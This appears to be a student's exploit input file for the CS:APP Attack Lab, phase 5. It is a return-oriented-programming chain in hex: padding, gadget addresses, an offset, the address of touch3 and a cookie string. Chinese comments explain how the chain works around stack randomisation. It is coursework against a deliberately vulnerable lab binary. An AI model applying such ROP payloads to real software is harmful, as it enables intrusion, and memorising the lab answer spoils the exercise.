00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
20 23 40 00 00 00 00 00
91 22 40 00 00 00 00 00
7d 22 40 00 00 00 00 00
48 00 00 00 00 00 00 00 
df 23 40 00 00 00 00 00         # Some Confuse:选择89 c1 38 db可以，但是89 c1 38 c9就不行(Segmentation Fault).
ff 23 40 00 00 00 00 00
e2 22 40 00 00 00 00 00
b9 22 40 00 00 00 00 00
91 22 40 00 00 00 00 00
c7 20 40 00 00 00 00 00
32 61 32 65 34 61 30 38
00 00 00 00 00 00 00 00 
# 基本思路：由于栈的起始位置随机化，不能确定在哪里放cookie的字符串，所以先用%rax记录下%rsp的位置，
# 然后计算好这个记录下来的位置和cookie的相对距离，到时候可以利用pop读取.
# 由于指令的限制，有的机器编码不能在gadget_farm里面找到，所以要多费些周折.
# 整体汇编代码及栈的注入：
#   mov %rsp,%rax
#   mov %rax,%rdi   <- 1st record of %rsp.(把%rsp存进来的时候%rsp实际上是下一个的位置)
#   pop %rax
#   (inject a const as bias which is waited to be caculated)    (=9*8=0x48)
#   mov %eax,%ecx
#   mov %ecx,%edx
#   mov %edx,%esi
#   lea(%rdi,%rsi,1),%rax       # 在原来的farm函数中就有这个lea指令.所以之前的所有准备都是把地址和偏移量放到 %rdi和%rsi里面.
#   mov %rax,%rdi
#   (address of "touch3")
#   (ASCII of cookie)
# 另需注意：
# （1）小端法
# （2）64位机器：补零